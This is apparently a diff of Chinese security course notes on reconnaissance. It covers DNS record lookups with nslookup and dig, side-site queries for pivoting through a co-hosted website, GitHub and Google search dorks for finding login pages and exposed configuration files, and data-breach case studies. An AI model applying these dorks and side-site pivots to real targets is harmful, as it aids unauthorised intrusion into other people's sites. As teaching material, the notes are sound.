+<h4 id="bie-ming-cname-ji-lu"><a href="#别名-CNAME-记录：" class="headerlink" title="别名(CNAME)记录："></a>别名(CNAME)记录：<a href="#bie-ming-cname-ji-lu" class="header-anchor">#</a></h4><p>也被成为规范名字。这种记录允许您将多个名字映射到同一台计算机。通常用于同时提供WWW和MAIL服务的计算机。例如，有一台计算机名为 <code>host.mydomain.com</code>（A记录）。它同时提供WWW和MAIL服务，为了便于用户访问服务。可以为该计算机设置两个别名（CNAME）：WWW和MAIL。这两个别名的全称就是<code>www.mydomain.com</code>和<code>mail.mydomain.com</code>。实际上他们都指向<code>host.mydomain.com</code>。同样的方法可以用于当您拥有多个域名需要指向同一服务器IP，此时您就可以将一个域名做A记录指向服务器IP，此时您就可以将一个域名做A记录指向服务器IP，然后将其他得域名做别名到之前做A记录得域名上，那么当您得服务器IP地址变更时您就可以不必麻烦得一个一个域名更改指向了，只需要改做A记录得那个域名其他做别名得那些域名得指向也将自动更改到新得IP地址上了。</p>
 <p>如何检测CNAME记录？</p>
 <p>1、进行命令行状态；</p>
 <p>2、输入命令“nslookup -q=cname 这里填写对应得域名或二级域名”查看返回得结果于设置得是否一致即可。</p>
-<h4><span id="mxmail-exchange记录">MX（Mail Exchange）记录：</span></h4><p>是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器。例如，当Internet上的某用户要发一封信给user@mydomain.com时，该用户的邮件系统通过DNS查找mydomain.com这个域名的MX记录，如果MX记录存在，用户计算机就将邮件发送到MX记录所指定的邮件服务器上。</p>
-<h4><span id="什么是txt记录">什么是TXT记录？</span></h4><p>TXT记录一般指为某个主机名或域名设置的说明，如：</p>
+<h4 id="mx-mail-exchange-ji-lu"><a href="#MX（Mail-Exchange）记录：" class="headerlink" title="MX（Mail Exchange）记录："></a>MX（Mail Exchange）记录：<a href="#mx-mail-exchange-ji-lu" class="header-anchor">#</a></h4><p>是邮件交换记录，它指向一个邮件服务器，用于电子邮件系统发邮件时根据收信人的地址后缀来定位邮件服务器。例如，当Internet上的某用户要发一封信给user@mydomain.com时，该用户的邮件系统通过DNS查找mydomain.com这个域名的MX记录，如果MX记录存在，用户计算机就将邮件发送到MX记录所指定的邮件服务器上。</p>
+<h4 id="shi-me-shi-txt-ji-lu"><a href="#什么是TXT记录？" class="headerlink" title="什么是TXT记录？"></a>什么是TXT记录？<a href="#shi-me-shi-txt-ji-lu" class="header-anchor">#</a></h4><p>TXT记录一般指为某个主机名或域名设置的说明，如：</p>
 <p>1）admin IN TXT “jack，mobile：13800138000”；</p>
 <p>2）mail IN TXT “邮件主机，存放在xxx，管理人：AAA”</p>
 <p>也就是您可以设置TXT，以便使别人联系到您。</p>
@@ -2712,7 +2711,7 @@
 <p>1、进入命令状态；</p>
 <p>2、输入命令 “nslookup -q=txt 这里填写对应的域名或二级域名”，查看返回的结果与设置的是否一致即可。</p>
 <p><img src="C:\Users\mirror\AppData\Roaming\Typora\typora-user-images\image-20220801134902496.png" alt="image-20220801134902496"></p>
-<h4><span id="什么是ns记录">什么是NS记录</span></h4><p>ns记录全称为Name Server是一种域名服务器记录，用来明确当前你的域名是由哪个DNS服务器来进行解析的</p>
+<h4 id="shi-me-shi-ns-ji-lu"><a href="#什么是NS记录" class="headerlink" title="什么是NS记录"></a>什么是NS记录<a href="#shi-me-shi-ns-ji-lu" class="header-anchor">#</a></h4><p>ns记录全称为Name Server是一种域名服务器记录，用来明确当前你的域名是由哪个DNS服务器来进行解析的</p>
 <p>参考文章：<a href="https://www.22.cn/help_34.html">https://www.22.cn/help_34.html</a></p>
 <p>在Kali Linux下，查询DNS解析可以通过nslookup来进行查询：</p>
 <p>查询命令：<code>nslookup 要查询的域名</code></p>
@@ -2727,13 +2726,13 @@
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKynSSqTP7HazbNic3tlLk93bHE98eNgBFsgt7XOYL5qKxOz26j960mTCvdWYFibkx7JDhQDx2uk93w/640?wx_fmt=png" alt="img"></p>
 <p>还有以下查询： </p>
 <p>​    A 地址记录(Ipv4)<br>　　AAAA 地址记录（Ipv6）<br>　　AFSDB Andrew文件系统数据库服务器记录（不懂）<br>　　ATMA ATM地址记录（不是自动提款机）<br>　　CNAME 别名记录<br>　　HINFO 硬件配置记录，包括CPU、操作系统信息<br>　　ISDN 域名对应的ISDN号码<br>　　MB 存放指定邮箱的服务器<br>　　MG 邮件组记录<br>　　MINFO 邮件组和邮箱的信息记录<br>　　MR 改名的邮箱记录<br>　　MX 邮件服务器记录<br>　　NS 名字服务器记录<br>　　PTR 反向记录（从IP地址解释域名）<br>　　RP 负责人记录<br>　　RT 路由穿透记录（不懂）<br>　　SRV TCP服务器信息记录（将有大用处）<br>　　TXT 域名对应的文本信息<br>　　X25 域名对应的X.25地址记录</p>
-<h4><span id="在kali下还有一个命令可以查看dns解析dig命令">在kali下还有一个命令可以查看DNS解析：dig命令。</span></h4><h5><span id="命令查询dig-baiducom">命令查询：dig baidu.com</span></h5><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKynSSqTP7HazbNic3tlLk93kqtWhG8sVUf3frPTzkr2ia4ouwJDvXXYOn3cWaxPSweQjKooOybOxNA/640?wx_fmt=png" alt="img"></p>
-<h5><span id="也可以指定dns服务器查询">也可以指定DNS服务器查询：</span></h5><p>命令查询：dig @114.114.114.114 baidu.com</p>
+<h4 id="zai-kali-xia-huan-you-yi-ge-ming-ling-ke-yi-cha-kan-dns-jie-xi-dig-ming-ling"><a href="#在kali下还有一个命令可以查看DNS解析：dig命令。" class="headerlink" title="在kali下还有一个命令可以查看DNS解析：dig命令。"></a>在kali下还有一个命令可以查看DNS解析：dig命令。<a href="#zai-kali-xia-huan-you-yi-ge-ming-ling-ke-yi-cha-kan-dns-jie-xi-dig-ming-ling" class="header-anchor">#</a></h4><h5 id="ming-ling-cha-xun-dig-baidu-com"><a href="#命令查询：dig-baidu-com" class="headerlink" title="命令查询：dig baidu.com"></a>命令查询：dig baidu.com<a href="#ming-ling-cha-xun-dig-baidu-com" class="header-anchor">#</a></h5><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKynSSqTP7HazbNic3tlLk93kqtWhG8sVUf3frPTzkr2ia4ouwJDvXXYOn3cWaxPSweQjKooOybOxNA/640?wx_fmt=png" alt="img"></p>
+<h5 id="ye-ke-yi-zhi-ding-dns-fu-wu-qi-cha-xun"><a href="#也可以指定DNS服务器查询：" class="headerlink" title="也可以指定DNS服务器查询："></a>也可以指定DNS服务器查询：<a href="#ye-ke-yi-zhi-ding-dns-fu-wu-qi-cha-xun" class="header-anchor">#</a></h5><p>命令查询：dig @114.114.114.114 baidu.com</p>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKynSSqTP7HazbNic3tlLk93VcObicTTadHdcUt99rVrFAsbsjutfqbPkLZFndU8DOWMR3aR6nyoHEA/640?wx_fmt=png" alt="img"></p>
-<h5><span id="查询mx记录dig-baiducom-mx">查询MX记录：dig baidu.com MX</span></h5><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKynSSqTP7HazbNic3tlLk934ZY9kvbHQtkUpxplEib0E9kCLzch8pfw2d3am5q01Agxb53XOoIzgqg/640?wx_fmt=png" alt="img"></p>
-<h5><span id="ip反查域名">IP反查域名：</span></h5><p>命令查询：dig -x IP</p>
+<h5 id="cha-xun-mx-ji-lu-dig-baidu-com-mx"><a href="#查询MX记录：dig-baidu-com-MX" class="headerlink" title="查询MX记录：dig baidu.com MX"></a>查询MX记录：dig baidu.com MX<a href="#cha-xun-mx-ji-lu-dig-baidu-com-mx" class="header-anchor">#</a></h5><p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKynSSqTP7HazbNic3tlLk934ZY9kvbHQtkUpxplEib0E9kCLzch8pfw2d3am5q01Agxb53XOoIzgqg/640?wx_fmt=png" alt="img"></p>
+<h5 id="ip-fan-cha-yu-ming"><a href="#IP反查域名：" class="headerlink" title="IP反查域名："></a>IP反查域名：<a href="#ip-fan-cha-yu-ming" class="header-anchor">#</a></h5><p>命令查询：dig -x IP</p>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKynSSqTP7HazbNic3tlLk93fns254DY8DBJL085Nrj4AQzGnlEVn1MwUa16oUJr0x6EDqsjiaiacBdw/640?wx_fmt=png" alt="img"></p>
-<h4><span id="旁站c段查询-隔山打牛">旁站C段查询-隔山打牛</span></h4><p>什么是旁站？旁站就是和目标网站在同一台服务器上的其他网站。</p>
+<h4 id="pang-zhan-c-duan-cha-xun-ge-shan-da-niu"><a href="#旁站C段查询-隔山打牛" class="headerlink" title="旁站C段查询-隔山打牛"></a>旁站C段查询-隔山打牛<a href="#pang-zhan-c-duan-cha-xun-ge-shan-da-niu" class="header-anchor">#</a></h4><p>什么是旁站？旁站就是和目标网站在同一台服务器上的其他网站。</p>
 <p>在我们做渗透过程中，当一个网站没有漏洞，无法突破，但是他有一个旁站，我们通过拿到旁站的Webshell提权拿到服务器，就相当于我们也同样的完成了本次渗透。</p>
 <p>旁站查询有很多工具和网站，我这边就用在线网站吧：</p>
 <p>域名：<a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p>
@@ -2742,33 +2741,33 @@
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKynSSqTP7HazbNic3tlLk93oA9ebr0wz0f0TRb9GT8cCicdzicqMlBmJhichGU2vKQgH5eAw37700LUQ/640?wx_fmt=png" alt="img"></p>
 <p>参考文章：</p>
 <p><a href="https://blog.csdn.net/qq_38265674/article/details/87898449">https://blog.csdn.net/qq_38265674/article/details/87898449</a></p>
-<h2><span id="9github-hacking-google-hacking">9.Github Hacking | Google Hacking</span></h2><p>我们都听过社会工程学这个名词，准确来说，社会工程学不是一门科学，而是一门艺术。而在社会工程学中，对信息掌握的充分程度是其中的关键。不光是这，在其它很多领域里我们都需要尽可能的搜集多的信息。</p>
+<h2 id="github-hacking-google-hacking"><a href="#Github-Hacking-Google-Hacking" class="headerlink" title="Github Hacking | Google Hacking"></a>Github Hacking | Google Hacking<a href="#github-hacking-google-hacking" class="header-anchor">#</a></h2><p>我们都听过社会工程学这个名词，准确来说，社会工程学不是一门科学，而是一门艺术。而在社会工程学中，对信息掌握的充分程度是其中的关键。不光是这，在其它很多领域里我们都需要尽可能的搜集多的信息。</p>
 <p>Github不仅能托管代码，还能对代码进行搜索，我们感受到了其便利的同时，也应该时刻注意，当你上传并公开你的代码时，一时大意，让某些敏感的配置信息文件等暴露于众。</p>
 <p>Github官方网站：<strong><a href="https://github.com/">https://github.com/</a></strong></p>
 <p>我们可以通过搜索页面或高级搜索页面搜索Github。</p>
 <p>我们还可以使用 &gt;, &gt;=, &lt;, 和 &lt;= 搜索，分别为：大于、大于等于、小于和小于等于。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">查询 示例</span><br><span class="line">&gt;n cats stars:&gt;<span class="number">1000</span> <span class="comment">#匹配含有&quot;cats&quot;字样、星标超过1000个的仓库。</span></span><br><span class="line">&gt;=n cats topics:&gt;=<span class="number">5</span> 匹配含有<span class="string">&quot;cats&quot;</span>字样、有<span class="number">5</span>个或更多主题的仓库。</span><br><span class="line">&lt;n cats size:&lt;<span class="number">10000</span> 匹配小于10kb的文件中含有<span class="string">&quot;cats&quot;</span>字样的代码。</span><br><span class="line">&lt;=n cats stars:&lt;=<span class="number">50</span> 匹配含有<span class="string">&quot;cats&quot;</span> 字样、星标不超过<span class="number">50</span>个的仓库。</span><br><span class="line">n..* cats stars:<span class="number">10.</span>.* 等同于stars:&gt;=<span class="number">10</span> 并匹配含有<span class="string">&quot;cats&quot;</span>字样、有<span class="number">10</span>个或更多星号的仓库</span><br><span class="line">*..n  cats stars:*.<span class="number">.10</span> 等同于 stars:&lt;=<span class="number">10</span> 并匹配含有 <span class="string">&quot;cats&quot;</span> 字样、有不超过 <span class="number">10</span> 个星号的仓库。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h5><span id="注意事项">注意事项：</span></h5><p>只能搜索小于384KB的文件。</p>
+<h5 id="zhu-yi-shi-xiang"><a href="#注意事项：" class="headerlink" title="注意事项："></a>注意事项：<a href="#zhu-yi-shi-xiang" class="header-anchor">#</a></h5><p>只能搜索小于384KB的文件。</p>
 <p>只能搜索少于500，000个文件的存储库</p>
 <p>登录的用户可以搜索所有公共存储库。</p>
 <p>除filename搜索外，搜索源代码时必须至少包含一个搜索词。例如，搜索</p>
 <p><code>language:javascript</code>无效，而是这样：<code>amazing language:javascript</code></p>
 <p>搜索结果最多可以显示来自同一文件的两个片段，但文件中可能会有更多结果。</p>
 <p>不能将以下通配符用作搜索查询的一部分：<strong>. , : ; / ‘ “ = * ! ? # $ &amp; + ^ | ~ &lt; &gt; ( ) { } 。</strong>搜索将忽略这些符号。</p>
-<h5><span id="日期条件">日期条件：</span></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cats pushed:&lt;2012-0705 搜索在2012年7月05日前push的代码，且cats作为关键</span><br><span class="line">cats pushed:2016-04-30..2016-07-04 日期区间</span><br><span class="line">cats created:&gt;=2017-04-01 创建时间</span><br></pre></td></tr></table></figure>
-<h5><span id="逻辑运算">逻辑运算：</span></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND、OR、NOT</span><br></pre></td></tr></table></figure>
-<h5><span id="排除运算">排除运算：</span></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">搜索在2012年07月05日前push代码，且cats作为关键字，排除java语言仓库</span><br><span class="line">cats pushed:&lt;2012-07-05 - language:java</span><br></pre></td></tr></table></figure>
-<h5><span id="包含搜索">包含搜索：</span></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hacker in:file 搜索文件中包含Hacker的代码</span><br><span class="line">Hacker in:path 搜索路径中包含Hacker的代码</span><br><span class="line">Hacker in:path,file 搜索路径、文件中包含Hacker的代码</span><br><span class="line">console path:app/public language:javascript #搜索关键字console，且语言为Javascript且路径在app/public下的代码</span><br></pre></td></tr></table></figure>
+<h5 id="ri-qi-tiao-jian"><a href="#日期条件：" class="headerlink" title="日期条件："></a>日期条件：<a href="#ri-qi-tiao-jian" class="header-anchor">#</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cats pushed:&lt;2012-0705 搜索在2012年7月05日前push的代码，且cats作为关键</span><br><span class="line">cats pushed:2016-04-30..2016-07-04 日期区间</span><br><span class="line">cats created:&gt;=2017-04-01 创建时间</span><br></pre></td></tr></table></figure>
+<h5 id="luo-ji-yun-suan"><a href="#逻辑运算：" class="headerlink" title="逻辑运算："></a>逻辑运算：<a href="#luo-ji-yun-suan" class="header-anchor">#</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AND、OR、NOT</span><br></pre></td></tr></table></figure>
+<h5 id="pai-chu-yun-suan"><a href="#排除运算：" class="headerlink" title="排除运算："></a>排除运算：<a href="#pai-chu-yun-suan" class="header-anchor">#</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">搜索在2012年07月05日前push代码，且cats作为关键字，排除java语言仓库</span><br><span class="line">cats pushed:&lt;2012-07-05 - language:java</span><br></pre></td></tr></table></figure>
+<h5 id="bao-han-sou-suo"><a href="#包含搜索：" class="headerlink" title="包含搜索："></a>包含搜索：<a href="#bao-han-sou-suo" class="header-anchor">#</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Hacker in:file 搜索文件中包含Hacker的代码</span><br><span class="line">Hacker in:path 搜索路径中包含Hacker的代码</span><br><span class="line">Hacker in:path,file 搜索路径、文件中包含Hacker的代码</span><br><span class="line">console path:app/public language:javascript #搜索关键字console，且语言为Javascript且路径在app/public下的代码</span><br></pre></td></tr></table></figure>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLLkjlBgpjQMZJhXKXVvRrgy0uFiamRiaBMYJg87E4p8glErZGIunuMiaG85X80W2Lmv49faIOpGZCAQ/640?wx_fmt=png" alt="img"></p>
-<h5><span id="主体搜索">主体搜索：</span></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user:USERNAME  用户名搜索</span><br><span class="line">org:``ORGNAME  组织搜索</span><br><span class="line">repo:USERNAME/PEPOSITORY  制定仓库搜索</span><br></pre></td></tr></table></figure>
+<h5 id="zhu-ti-sou-suo"><a href="#主体搜索：" class="headerlink" title="主体搜索："></a>主体搜索：<a href="#zhu-ti-sou-suo" class="header-anchor">#</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user:USERNAME  用户名搜索</span><br><span class="line">org:``ORGNAME  组织搜索</span><br><span class="line">repo:USERNAME/PEPOSITORY  制定仓库搜索</span><br></pre></td></tr></table></figure>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLLkjlBgpjQMZJhXKXVvRrgiaicj3FGPY3e6L6KVibRUBXK7zD4qcMnz2Wb9iaOd8UaNoicJU81qdYb28A/640?wx_fmt=png" alt="img"></p>
-<h5><span id="文件大小">文件大小：</span></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">size:&gt;1000 搜索大小大于1KB的文件</span><br></pre></td></tr></table></figure>
+<h5 id="wen-jian-da-xiao"><a href="#文件大小：" class="headerlink" title="文件大小："></a>文件大小：<a href="#wen-jian-da-xiao" class="header-anchor">#</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">size:&gt;1000 搜索大小大于1KB的文件</span><br></pre></td></tr></table></figure>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLLkjlBgpjQMZJhXKXVvRrgO56ug2mHr3gxzcZlGpNIPOzsAaicKWEibdwpYk4utnuGZmW86KvDkAqw/640?wx_fmt=png" alt="img"></p>
-<h5><span id="文件名称">文件名称：</span></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">搜索文件名为config.php，且语言为PHP的代码</span><br><span class="line">filename:config.php language:php</span><br></pre></td></tr></table></figure>
+<h5 id="wen-jian-ming-cheng"><a href="#文件名称：" class="headerlink" title="文件名称："></a>文件名称：<a href="#wen-jian-ming-cheng" class="header-anchor">#</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">搜索文件名为config.php，且语言为PHP的代码</span><br><span class="line">filename:config.php language:php</span><br></pre></td></tr></table></figure>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLLkjlBgpjQMZJhXKXVvRrg1nUXN9IiareGh7AKMeLlnQ9JibsBpQHFxuXXz6eBQtcDjKDdnywFRibgw/640?wx_fmt=png" alt="img"></p>
-<h5><span id="扩展名">扩展名：</span></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extension:EXTENSION 指定扩展名搜索</span><br><span class="line">例如：php extension:config</span><br></pre></td></tr></table></figure>
+<h5 id="kuo-zhan-ming"><a href="#扩展名：" class="headerlink" title="扩展名："></a>扩展名：<a href="#kuo-zhan-ming" class="header-anchor">#</a></h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extension:EXTENSION 指定扩展名搜索</span><br><span class="line">例如：php extension:config</span><br></pre></td></tr></table></figure>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLLkjlBgpjQMZJhXKXVvRrgAbrSnFiaeHPDdwKakJjUq7QibGajlSSgbVpiabdkk4CicO14YUJ2cibunBA/640?wx_fmt=png" alt="img"></p>
-<h2><span id="10google-hacking">10.Google Hacking</span></h2><p>利用Google搜索相关信息并进行入侵的过程就叫做Google Hack。</p>
+<h2 id="google-hacking"><a href="#Google-Hacking" class="headerlink" title="Google Hacking"></a>Google Hacking<a href="#google-hacking" class="header-anchor">#</a></h2><p>利用Google搜索相关信息并进行入侵的过程就叫做Google Hack。</p>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLLkjlBgpjQMZJhXKXVvRrg1YISyKuPORqmENTJKFuhgARro4zt58Ja7ic1ToMN1susoMwYHmI525A/640?wx_fmt=png" alt="img"></p>
 <p><strong>通配符：</strong></p>
 <div class="table-container">
@@ -2815,7 +2814,7 @@
 </tbody>
 </table>
 </div>
-<h4><span id="高级语法">高级语法：</span></h4><p>语法的组成——— 语句:关键词</p>
+<h4 id="gao-ji-yu-fa"><a href="#高级语法：" class="headerlink" title="高级语法："></a>高级语法：<a href="#gao-ji-yu-fa" class="header-anchor">#</a></h4><p>语法的组成——— 语句:关键词</p>
 <div class="table-container">
 <table>
 <thead>
@@ -2864,15 +2863,48 @@
 </tbody>
 </table>
 </div>
-<h5><span id="示例一搜索标题含有login的网站">示例一：搜索标题含有login的网站</span></h5><p><code>intitle:login</code></p>
+<h5 id="shi-li-yi-sou-suo-biao-ti-han-you-login-de-wang-zhan"><a href="#示例一：搜索标题含有login的网站" class="headerlink" title="示例一：搜索标题含有login的网站"></a>示例一：搜索标题含有login的网站<a href="#shi-li-yi-sou-suo-biao-ti-han-you-login-de-wang-zhan" class="header-anchor">#</a></h5><p><code>intitle:login</code></p>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLLkjlBgpjQMZJhXKXVvRrgn3cYpFnkPbpvCXGKsmIqswg0kRZX04Po4ibP5PcVuVwfGtKa8Bc5IicQ/640?wx_fmt=png" alt="img"></p>
-<h5><span id="示例二搜索链接含有wp-loginphp也就是wordpress的网站">示例二：搜索链接含有/wp-login.php(也就是wordpress)的网站</span></h5><p><code>inurl:/wp-login.php</code></p>
+<h5 id="shi-li-er-sou-suo-lian-jie-han-you-wp-login-php-ye-jiu-shi-wordpress-de-wang-zhan"><a href="#示例二：搜索链接含有-wp-login-php-也就是wordpress-的网站" class="headerlink" title="示例二：搜索链接含有/wp-login.php(也就是wordpress)的网站"></a>示例二：搜索链接含有/wp-login.php(也就是wordpress)的网站<a href="#shi-li-er-sou-suo-lian-jie-han-you-wp-login-php-ye-jiu-shi-wordpress-de-wang-zhan" class="header-anchor">#</a></h5><p><code>inurl:/wp-login.php</code></p>
 <p><img src="https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LLLkjlBgpjQMZJhXKXVvRrgChyicWHJxMRWy8kK0KT0FfwzNib2Vibib8l5TgBQHMLS4GfpQe9nnAZ9VQ/640?wx_fmt=png" alt="img"></p>
 <p>参考文章：</p>
 <p><a href="https://docs.github.com/cn/free-pro-team@latest/github/searching-for-information-on-github/understanding-the-search-syntax">https://docs.github.com/cn/free-pro-team@latest/github/searching-for-information-on-github/understanding-the-search-syntax</a></p>
 <p><a href="https://blog.csdn.net/qq_36119192/article/details/99690742">https://blog.csdn.net/qq_36119192/article/details/99690742</a></p>
 <p><a href="https://www.cnblogs.com/jerrylocker/p/10956631.html">https://www.cnblogs.com/jerrylocker/p/10956631.html</a></p>
-<h2><span id="11汇总练习-围绕以下三个模块收集相关案例包括事件过程的起因-经过-结果以及对我们的启示">11.汇总练习-围绕以下三个模块收集相关案例，包括事件过程的起因、经过、结果以及对我们的启示</span></h2><h3><span id="上网安全">上网安全</span></h3><h3><span id="密码口令">密码口令</span></h3><h3><span id="数据安全">数据安全</span></h3>]]></content>
+<h2 id="hui-zong-lian-xi-wei-rao-yi-xia-san-ge-mo-kuai-shou-ji-xiang-guan-an-li-bao-gua-shi-jian-guo-cheng-de-qi-yin-jing-guo-jie-guo-yi-ji-dui-wo-men-de-qi-shi"><a href="#汇总练习-围绕以下三个模块收集相关案例，包括事件过程的起因、经过、结果以及对我们的启示" class="headerlink" title="汇总练习-围绕以下三个模块收集相关案例，包括事件过程的起因、经过、结果以及对我们的启示"></a>汇总练习-围绕以下三个模块收集相关案例，包括事件过程的起因、经过、结果以及对我们的启示<a href="#hui-zong-lian-xi-wei-rao-yi-xia-san-ge-mo-kuai-shou-ji-xiang-guan-an-li-bao-gua-shi-jian-guo-cheng-de-qi-yin-jing-guo-jie-guo-yi-ji-dui-wo-men-de-qi-shi" class="header-anchor">#</a></h2><h3 id="shang-wang-an-quan"><a href="#上网安全" class="headerlink" title="上网安全"></a>上网安全<a href="#shang-wang-an-quan" class="header-anchor">#</a></h3><h3 id="mi-ma-kou-ling"><a href="#密码口令" class="headerlink" title="密码口令"></a>密码口令<a href="#mi-ma-kou-ling" class="header-anchor">#</a></h3><h3 id="shu-ju-an-quan"><a href="#数据安全" class="headerlink" title="数据安全"></a>数据安全<a href="#shu-ju-an-quan" class="header-anchor">#</a></h3><h4 id="1-chuan-wei-bo-5-38-yi-yong-hu-shu-ju-zai-an-wang-chu-shou-guan-fang-cheng-jin-shou-ji-hao-xie-lu"><a href="#1-传微博5-38亿用户数据在暗网出售，官方称仅手机号泄露" class="headerlink" title="1.传微博5.38亿用户数据在暗网出售，官方称仅手机号泄露"></a>1.传微博5.38亿用户数据在暗网出售，官方称仅手机号泄露<a href="#1-chuan-wei-bo-5-38-yi-yong-hu-shu-ju-zai-an-wang-chu-shou-guan-fang-cheng-jin-shou-ji-hao-xie-lu" class="header-anchor">#</a></h4><p><strong>起因</strong>：某新闻频道3月19日讯，近日，有用户发现5.38亿条微博用户信息在暗网出售，其中，1.72亿条有账户基本信息，售价0.177比特币。涉及到的账号信息包括用户ID、账号发布的微博数、粉丝数、关注数、性别、地理位置等。</p>
+<p><strong>经过</strong>：3 月 19 日，安全专家云舒在微博上称：“很多人的手机号码泄露了，根据微博账号就能查到手机号… 已经有人通过微博泄露查到我的手机号码，来加我微信了。” 在其微博留言中，多名微博网友确认手机号泄露。有一名网友留言，“刚刚查了下我的，确实泄露了，电话号码、身份证、物理地址都正确。”除了网友手机号，“包括明星、企业家、公务员等人在内”的手机号都被泄露。</p>
+<p>据悉，“安全 _ 云舒”微博的个人主页显示，他是默安科技创始人兼 CTO，原阿里集团安全研究实验室总监。根据 36 氪的求证，这名网友为默安科技 CTO 魏兴国。</p>
+<p>截至笔者撰文时，“安全 _ 云舒”发布的 2 条相关微博已经删除。</p>
+<p><strong>结果</strong>：针对本次数据泄露事件，微博认证“微博安全总监”的网友罗诗尧在微博中回复称：多谢关心，每隔段时间就有人在网上卖（数据），每次都会引起一波舆情，本不想回应，这条微博今后还会用得上。</p>
+<p>至于本次数据泄露的原因，安全 _ 云舒称，这次数据泄露或是由于微博在 2019 年被人通过接口“薅走了一些数据”，而不是所谓的“数据拖库”。</p>
+<p>而罗诗尧回应，泄漏的手机号是 19 年通过通讯录上传接口被暴力匹配的，其余公开信息都是网上抓来的。他还表示,19 年被刷的部分数据，<code>内部突发现异常后马上堵住了口子。我们第一时间报了警，取证后把相关信息递到了警方，同时一直也在追查网上售卖信息的黑灰产</code>。用户的隐私至关重要，尤其还是涉及到手机号。</p>
+<p>微博方面表示，微博一直提供根据通讯录手机号查询微博好友昵称的服务，用户授权后可以使用该服务，但微博不提供用户性别和身份证号等信息，也没有“根据用户昵称查手机号的服务。2018 年底，有用户利用微博相关接口通过批量手机批量上传通讯录，匹配出几百万个账号昵称，再加上通过其他渠道获取的信息一起对外出售。此次非法调用微博接口匹配出的信息为微博账号昵称，不涉及身份证、密码，对微博服务没有影响。“发现异常后，我们及时加强了安全策略，今后还将不断强化。</p>
+<p><strong>心得</strong>：对于本次数据泄露事件，一名业内安全专家向笔者表示，对于微博的数据泄露，第一不能轻视，第二也不用太夸大，因为这是我们每年许多数据泄露事件中的一起。现在，随着所有互联网公司都在做数字化转型，其实每一个企业都掌握了大量客户信息。这些信息如果保护不到位的话，都会出现数据泄露。同时这些企业本身也要做好用户数据的隐私保护工作，对内部员工加强监管。而作为一个普通用户，我们可以采取一些举措去有效地保护个人数据：</p>
+<ol>
+<li>在不同平台设置不同密码，并在某个固定时间去修改所有密码。这样虽然麻烦点，但是好处是，一旦数据泄露，影响面比较小。并且，频繁修改密码后，即使发生泄露，信息有效性的时间会比较短；</li>
+<li>重要信息分类使用。当获取服务时，手机要绑定个人信息，要多加注意被绑定的信息。</li>
+</ol>
+<h4 id="2-wordpress-zhong-yi-zhi-lou-dong-bei-hei-ke-li-yong-shu-bai-wan-wang-zhan-shu-ju-ku-zao-dao-qie-qu"><a href="#2-WordPress中已知漏洞被黑客利用，数百万网站数据库遭到窃取" class="headerlink" title="2.WordPress中已知漏洞被黑客利用，数百万网站数据库遭到窃取"></a>2.WordPress中已知漏洞被黑客利用，数百万网站数据库遭到窃取<a href="#2-wordpress-zhong-yi-zhi-lou-dong-bei-hei-ke-li-yong-shu-bai-wan-wang-zhan-shu-ju-ku-zao-dao-qie-qu" class="header-anchor">#</a></h4><p>起因：据外媒报道，2020年中旬，黑客组织试图利用主题和插件中的已知漏洞从数百万个WordPress网站窃取数据库凭据。对于此次WordPress面临的威胁，根据WordPress安全公司Defiant的研究数据，其防火墙在5月29日至5月31日之间阻止了超过1.3亿次尝试从130万个站点收集数据库凭据，请求的数量在5月30日达到峰值。随后，Defiant接受记者采访时表示，这些攻击影响了WordPress三分之一以上的客户，同时，该公司认为此活动针对的网站总数可能超过1000万。</p>
+<p>经过：在这场大规模的攻击活动中，网络犯罪分子在整个WordPress生态系统中使用了多个插件和主题漏洞。具体来说，他们尝试从WordPress网站下载wp-config.php配置文件，该文件除其他信息外，还包含可用于访问WordPress网站数据库的用户名和密码。</p>
